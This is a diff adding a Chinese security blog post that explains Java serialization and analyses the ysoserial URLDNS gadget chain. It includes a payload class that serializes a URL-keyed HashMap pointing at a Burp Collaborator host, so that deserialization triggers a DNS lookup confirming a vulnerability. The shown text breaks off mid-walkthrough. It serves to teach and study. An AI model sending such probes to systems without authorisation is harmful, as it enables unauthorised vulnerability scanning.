@@ -1,0 +1,902 @@
+<!DOCTYPE html>
+<html lang="en-us" class="light">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.118.2">
+
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="generator" content="Saber v0.11.2">
+    <meta name="author" content="F0rmat" />
+    <meta name="keywords" content="专注于信息安全、内网渗透、红队攻防" />
+    <meta name="og:site_name" content="F0rmat&#39;s Blog" />
+    <link rel="canonical" href="https://xxe.icu/urldns_chain_analysis.html" /><meta property="og:type" content="article" />
+    <meta property="title" content="Java代码审计-URLDNS链分析 - F0rmat&#39;s Blog">
+    <meta property="og:title" content="Java代码审计-URLDNS链分析 - F0rmat&#39;s Blog">
+    <meta property="twitter:title" content="Java代码审计-URLDNS链分析 - F0rmat&#39;s Blog">
+    <meta name="description" content="0x00 前言 本文所述的是URLDNS利用链分析，在此之前还要先介绍一下一个⾥程碑碑式的工具：ysoserial 引用官网的一句描述： ysoserial is a collection of utilities and property-oriented">
+    <meta property="og:description" content="0x00 前言 本文所述的是URLDNS利用链分析，在此之前还要先介绍一下一个⾥程碑碑式的工具：ysoserial 引用官网的一句描述： ysoserial is a collection of utilities and property-oriented">
+    <meta property="twitter:description" content="0x00 前言 本文所述的是URLDNS利用链分析，在此之前还要先介绍一下一个⾥程碑碑式的工具：ysoserial 引用官网的一句描述： ysoserial is a collection of utilities and property-oriented">
+    <meta property="og:type" content="article">
+    <title>Java代码审计-URLDNS链分析 - F0rmat&#39;s Blog</title>
+
+    <meta property="og:url" content="https://xxe.icu/urldns_chain_analysis.html" />
+
+    
+    <meta property="og:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <meta property="twitter:image" content="https://avatars.githubusercontent.com/u/16066632?v=4">
+    <link rel="shortcut icon" href="https://avatars.githubusercontent.com/u/16066632?v=4" type="image/x-png" />
+    
+      
+      <link rel="stylesheet" href="/css/main.min.dbdd30bb57b959228eef6e0f4a297b76d6edfad348d99701f8d68535ea50105a.css" integrity="sha256-290wu1e5WSKO724PSil7dtbt+tNI2ZcB+NaFNepQEFo="/>
+    
+    
+  <link rel="stylesheet" href="/css/syntax.css"/>
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1607597_jhmihcvh0tm.css" />
+    <link href="/index.xml" rel="alternate" type="application/rss+xml" title="F0rmat&#39;s Blog">
+    
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</head>
+
+<body class="bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100 tracking-wider leading-normal">
+
+    <nav id="header" class="bg-white dark:bg-gray-800 fixed w-full z-10 top-0 shadow">
+
+  <div id="progress" class="h-1 z-20 top-0" style="background:linear-gradient(to right, #4dc0b5 var(--scroll), transparent 0);"></div>
+
+  <div class="w-full container mx-auto flex flex-wrap items-center justify-between my-1">
+      <div class="pl-4">
+          <a class="text-base no-underline hover:no-underline font-bold"  href="/">
+              F0rmat&#39;s Blog
+          </a>
+      </div>
+
+      <div class="block lg:hidden pr-4">
+          <button id="nav-toggle" class="flex items-center px-3 py-2 border rounded text-gray-500 border-gray-600 hover:text-gray-900 hover:border-teal-500 appearance-none focus:outline-none">
+              <svg class="fill-current h-3 w-3" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg"><title>Menu</title><path d="M0 3h20v2H0V3zm0 6h20v2H0V9zm0 6h20v2H0v-2z"/></svg>
+          </button>
+      </div>
+
+      <div class="w-full flex-grow lg:flex lg:items-center lg:w-auto hidden mt-2 lg:mt-0 bg-gray-100 dark:bg-gray-800 md:bg-transparent z-20" id="nav-content">
+          <ul class="list-none lg:flex justify-end flex-1 items-center">
+                    <li class="mr-3">
+                    <a href="/" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">HOME</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/posts.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ARCHIVE</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/about.html" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">ABOUT</a>
+                    </li>
+                    <li class="mr-3">
+                    <a href="/atom.xml" class="inline-block py-2 px-2 text-gray-700 dark:text-gray-300 font-bold no-underline">RSS</a>
+                    </li>
+                <button id="switchTheme" class="h-10 w-10 flex justify-center items-center focus:outline-none">
+                    <div id="dark-icon" class="hidden">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Dark Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"></path></svg>
+                    </div>
+                    <div id="light-icon">
+                        <svg data-v-297af853="" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="w-6 h-6"><title data-v-297af853="">Light Mode</title> <path data-v-297af853="" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg>
+                    </div> 
+                </button>
+          </ul>
+      </div>
+  </div>
+</nav>
+
+    <div id="container" class="container w-full flex flex-wrap mx-auto px-2 lg:pt-12 mt-10">
+<section class="w-full lg:w-3/4 xl:w-3/4">
+
+    
+    <div class="px-8 py-6 mt-6 lg:mt-0 leading-normal rounded shadow bg-white dark:bg-gray-800">
+
+        
+        <div>
+    <h1 class="font-bold break-normal text-gray-800 pt-2 pb-2 text-2xl lg:text-3xl dark:text-gray-200">
+        <a href="https://xxe.icu/urldns_chain_analysis.html" title="Java代码审计-URLDNS链分析">Java代码审计-URLDNS链分析</a>
+    </h1>
+    <p class="mb-1 text-sm text-gray-500 dark:text-gray-200">
+        <span title=" 2022-06-01 11:04:34 CST">
+            <i class="iconfont icon-calendar" aria-hidden="true"></i> 01 Jun 2022
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-book"></i>
+            4277 字
+        </span>
+
+        <span class="hidden xl:inline-block">
+            |
+            <i class="iconfont icon-clock-o"></i>
+            9 分钟读完
+        </span>
+    </p>
+</div>
+
+
+        <div class="md:hidden dark:text-gray-100">
+            
+<p class="text-base font-bold py-2 yg:pb-6 text-gray-700 dark:text-gray-300">文章目录</p>
+    <div class="sticky text-sm" style="top:6em;" id="menu-content">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-java序列化和反序列化">0x01 Java序列化和反序列化</a>
+      <ul>
+        <li><a href="#java序列化">Java序列化</a></li>
+        <li><a href="#java反序列化">Java反序列化</a></li>
+        <li><a href="#为什么需要序列化与反序列化">为什么需要序列化与反序列化？</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x02-urldns链分析">0x02 URLDNS链分析</a>
+      <ul>
+        <li><a href="#序列化分析">序列化分析</a></li>
+        <li><a href="#反序列化分析">反序列化分析</a></li>
+        <li><a href="#ysoserial之urldns分析">ysoserial之URLDNS分析</a></li>
+      </ul>
+    </li>
+    <li><a href="#0x03-总结">0x03 总结</a></li>
+    <li><a href="#0x04-参考">0x04 参考</a></li>
+  </ul>
+</nav>
+    </div>
+
+        </div> 
+
+        <div class="post-content dark:text-gray-300">
+            <h1 id="0x00-前言">0x00 前言</h1>
+<p>本文所述的是URLDNS利用链分析，在此之前还要先介绍一下一个⾥程碑碑式的工具：<a href="https://github.com/frohoff/ysoserial">ysoserial</a></p>
+<p>引用官网的一句描述：</p>
+<blockquote>
+<p><strong>ysoserial</strong> is a collection of utilities and property-oriented programming &ldquo;gadget chains&rdquo; discovered in common java libraries that can, under the right conditions, exploit Java applications performing <strong>unsafe deserialization</strong> of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application host.</p>
+</blockquote>
+<p>该工具它可以让⽤户根据⾃⼰选择的利⽤链，⽣成反序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏⽤户预先定义的命令。</p>
+<p>而URLDNS就是ysoserial其中的一条利用链，虽然说不能执行命令，但可以检测是否存在反序列化漏洞。</p>
+<p>利利⽤用链也叫“gadget chains”，我们通常称为gadget。</p>
+<h1 id="0x01-java序列化和反序列化">0x01 Java序列化和反序列化</h1>
+<p>在了解URLDNS链之前我们先来理解一下Java的序列化和反序列化的概念。</p>
+<p>我们知道PHP也是存在序列化和反序列化的，PHP中是使用各种魔术方法来实现，那在Java中就是使用readObject和writeObject来实现的。</p>
+<blockquote>
+<p>在看本文时记得先去学习一下Java的基础，下面只是作为回顾介绍</p>
+</blockquote>
+<h2 id="java序列化">Java序列化</h2>
+<p>对象序列化的最主要的用处就是在传递和保存对象的时候，保证对象的完整性和可传递性。序列化是把对象转换成有序字节流，以便在网络上传输或者保存在本地文件中。核心作用是对象状态的保存与重建。</p>
+<p>我们先建立一个可序列化的普通类,这个类必须要实现一个接口<code>java.io.Serializable</code>才能被序列化：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Serializable_01</span> <span class="kd">implements</span> <span class="n">Serializable</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">int</span> <span class="n">age</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">Method1</span><span class="o">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Method1 Running&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s">&#34;Serializable_01{&#34;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;name=&#39;&#34;</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="sc">&#39;\&#39;&#39;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="s">&#34;, age=&#34;</span> <span class="o">+</span> <span class="n">age</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">                <span class="sc">&#39;}&#39;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">Serializable_01</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">int</span> <span class="n">age</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">this</span><span class="o">.</span><span class="na">age</span> <span class="o">=</span> <span class="n">age</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>接下来我们来对该对象进行序列化：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Serial_Test</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Serializable_01</span> <span class="n">Ser</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Serializable_01</span><span class="o">(</span><span class="s">&#34;xiaomign&#34;</span><span class="o">,</span><span class="n">12</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">obj</span>  <span class="o">=</span><span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">         <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">&#34;xiaoming.ser&#34;</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">obj</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">Ser</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>我们实例化了<code>Serializable_01</code>对象，然后利用对象的构造函数赋值，最后使用<code>writeObject</code>进行把对象变成二进制内容写入到了<code>xiaoming.ser</code>文件中，这样序列化就完成了。</p>
+<p>如果我们想要看序列化后的内容，可以使用一个工具进行查询<a href="https://github.com/NickstaDB/SerializationDumper">SerializationDumper</a></p>
+<p>使用方法：</p>
+<p><code>java -jar SerializationDumper-v1.13.jar -r xiaoming.ser</code></p>
+<p>查询刚才序列化的文件结果：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">STREAM_MAGIC - 0xac ed
+</span></span><span class="line"><span class="cl">STREAM_VERSION - 0x00 05
+</span></span><span class="line"><span class="cl">Contents
+</span></span><span class="line"><span class="cl">  TC_OBJECT - 0x73
+</span></span><span class="line"><span class="cl">    TC_CLASSDESC - 0x72
+</span></span><span class="line"><span class="cl">      className
+</span></span><span class="line"><span class="cl">        Length - 15 - 0x00 0f
+</span></span><span class="line"><span class="cl">        Value - Serializable_01 - 0x53657269616c697a61626c655f3031
+</span></span><span class="line"><span class="cl">      serialVersionUID - 0x0f e1 71 6f 69 bd 44 6f
+</span></span><span class="line"><span class="cl">      newHandle 0x00 7e 00 00
+</span></span><span class="line"><span class="cl">      classDescFlags - 0x02 - SC_SERIALIZABLE
+</span></span><span class="line"><span class="cl">      fieldCount - 2 - 0x00 02
+</span></span><span class="line"><span class="cl">      Fields
+</span></span><span class="line"><span class="cl">        0:
+</span></span><span class="line"><span class="cl">          Int - I - 0x49
+</span></span><span class="line"><span class="cl">          fieldName
+</span></span><span class="line"><span class="cl">            Length - 3 - 0x00 03
+</span></span><span class="line"><span class="cl">            Value - age - 0x616765
+</span></span><span class="line"><span class="cl">        1:
+</span></span><span class="line"><span class="cl">          Object - L - 0x4c
+</span></span><span class="line"><span class="cl">          fieldName
+</span></span><span class="line"><span class="cl">            Length - 4 - 0x00 04
+</span></span><span class="line"><span class="cl">            Value - name - 0x6e616d65
+</span></span><span class="line"><span class="cl">          className1
+</span></span><span class="line"><span class="cl">            TC_STRING - 0x74
+</span></span><span class="line"><span class="cl">              newHandle 0x00 7e 00 01
+</span></span><span class="line"><span class="cl">              Length - 18 - 0x00 12
+</span></span><span class="line"><span class="cl">              Value - Ljava/lang/String; - 0x4c6a6176612f6c616e672f537472696e673b
+</span></span><span class="line"><span class="cl">      classAnnotations
+</span></span><span class="line"><span class="cl">        TC_ENDBLOCKDATA - 0x78
+</span></span><span class="line"><span class="cl">      superClassDesc
+</span></span><span class="line"><span class="cl">        TC_NULL - 0x70
+</span></span><span class="line"><span class="cl">    newHandle 0x00 7e 00 02
+</span></span><span class="line"><span class="cl">    classdata
+</span></span><span class="line"><span class="cl">      Serializable_01
+</span></span><span class="line"><span class="cl">        values
+</span></span><span class="line"><span class="cl">          age
+</span></span><span class="line"><span class="cl">            (int)12 - 0x00 00 00 0c
+</span></span><span class="line"><span class="cl">          name
+</span></span><span class="line"><span class="cl">            (object)
+</span></span><span class="line"><span class="cl">              TC_STRING - 0x74
+</span></span><span class="line"><span class="cl">                newHandle 0x00 7e 00 03
+</span></span><span class="line"><span class="cl">                Length - 8 - 0x00 08
+</span></span><span class="line"><span class="cl">                Value - xiaomign - 0x7869616f6d69676e
+</span></span></code></pre></div><h2 id="java反序列化">Java反序列化</h2>
+<p>当然有序列化就有反序列化，反序列化就是客户端从文件中或网络上获得序列化后的对象字节流，根据字节流中所保存的对象状态及描述信息，通过反序列化重建对象。</p>
+<p>上面我们使用<code>writeObject</code>来进行写入序列化内容，我们就可以使用<code>readObject</code>来反序列化序列化后的文件。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">UnSerial_Test</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Serializable_01</span> <span class="n">Ser</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectInputStream</span> <span class="n">obj</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">&#34;xiaoming.ser&#34;</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Ser</span> <span class="o">=</span> <span class="o">(</span><span class="n">Serializable_01</span><span class="o">)</span> <span class="n">obj</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Ser</span><span class="o">.</span><span class="na">Method1</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">Ser</span><span class="o">.</span><span class="na">name</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">obj</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>上面代码执行后输出的结果：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Method1 Running
+</span></span><span class="line"><span class="cl">xiaomign
+</span></span></code></pre></div><p>有些同学很奇怪说为什么要加这一句啊：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Ser</span> <span class="o">=</span> <span class="o">(</span><span class="n">Serializable_01</span><span class="o">)</span> <span class="n">obj</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+</span></span></code></pre></div><p>如果我们直接使用下面来触发<code>ToString</code>方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">System.out.println(obj.readObject());
+</span></span></code></pre></div><p>发现输出下面内容：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Serializable_01{name=&#39;xiaomign&#39;, age=12}
+</span></span></code></pre></div><p>但是你无法使用<code>obj.readObject().Method1</code>去触发对象里面的方法，因为没有用对象转换之前是一个<code>Object</code>类，所以只能出发<code>Object</code>类默认的方法。</p>
+<h2 id="为什么需要序列化与反序列化">为什么需要序列化与反序列化？</h2>
+<p>为什么要序列化，那就是说一下序列化的好处喽，序列化有什么什么优点，所以我们要序列化。</p>
+<p><strong>一：对象序列化可以实现分布式对象。</strong></p>
+<p>主要应用例如：RMI(即远程调用Remote Method Invocation)要利用对象序列化运行远程主机上的服务，就像在本地机上运行对象时一样。</p>
+<p><strong>二：java对象序列化不仅保留一个对象的数据，而且递归保存对象引用的每个对象的数据。</strong></p>
+<p>可以将整个对象层次写入字节流中，可以保存在文件中或在网络连接上传递。利用对象序列化可以进行对象的&quot;深复制&quot;，即复制对象本身及引用的对象本身。序列化一个对象可能得到整个对象序列。</p>
+<p><strong>三：序列化可以将内存中的类写入文件或数据库中。</strong></p>
+<p>比如：将某个类序列化后存为文件，下次读取时只需将文件中的数据反序列化就可以将原先的类还原到内存中。也可以将类序列化为流数据进行传输。</p>
+<p>总的来说就是将一个已经实例化的类转成文件存储，下次需要实例化的时候只要反序列化即可将类实例化到内存中并保留序列化时类中的所有变量和状态。</p>
+<p><strong>四：对象、文件、数据，有许多不同的格式，很难统一传输和保存。</strong></p>
+<p>序列化以后就都是字节流了，无论原来是什么东西，都能变成一样的东西，就可以进行通用的格式传输或保存，传输结束以后，要再次使用，就进行反序列化还原，这样对象还是对象，文件还是文件。</p>
+<blockquote>
+<p>这块内容摘录自：<a href="https://www.cnblogs.com/javazhiyin/">Java知音</a></p>
+</blockquote>
+<h1 id="0x02-urldns链分析">0x02 URLDNS链分析</h1>
+<p>URLDNS是ysoserial中一个利用链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p>
+<p>但是它有以下优点：</p>
+<ul>
+<li>使用Java内置的类构造，对第三方库没有依赖</li>
+<li>在目标没有回显的时候，能够通过DNS来判断是否存在反序列化漏洞</li>
+</ul>
+<h2 id="序列化分析">序列化分析</h2>
+<p>我们先来写一个序列化的对象：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">UrlDnsExp</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">URL</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;</span><span class="n">URL</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URL</span><span class="o">(</span><span class="s">&#34;http://hyji8wgb7eebb7rimnzf84prfil9mxb.oastify.com&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">obj</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">url</span><span class="o">,</span><span class="s">&#34;1234&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="c1">//序列化
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">FileOutputStream</span> <span class="n">fo</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">&#34;dns.ser&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">fo</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">obj</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>我们来运行一下就可以发现burp上面的Collaborator记录了两条DNS的访问：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/1.png" alt=""></p>
+<p>为什么能触发DNS访问呢？我们可以Debug一下触发的流程：</p>
+<p>先在put的地方下一个断点：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/2.png" alt="2"></p>
+<p>跟到<code>put</code>方法，这里也解释上面为什么要赋两个值了，而且第一个必须是URL的类，因为要把URL对象传到hash方法到中：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/3.png" alt="3"></p>
+<p>继续跟<code>hash</code>方法：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/4.png" alt="4"></p>
+<p>如果<code>key</code>不等于空，那么就执行<code>key</code>的hashCode方法，<code>key</code>是一个URL的对象，所以会跳到URL类里面的hashCode方法：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/5.png" alt="5"></p>
+<p>判断如果不等于-1那么就往下执行，这里的hashCode默认就是-1：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/6.png" alt="6"></p>
+<p>还有下面的handler指向的是<code>URLStreamHandler</code>类的hashCode方法：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/7.png" alt="7"></p>
+<p>继续往下跟<code>getHostAddress</code>方法：</p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/urldns/8.png" alt="8"></p>
+<p>到URL类中的<code> InetAddress.getByName</code>方法：</p>
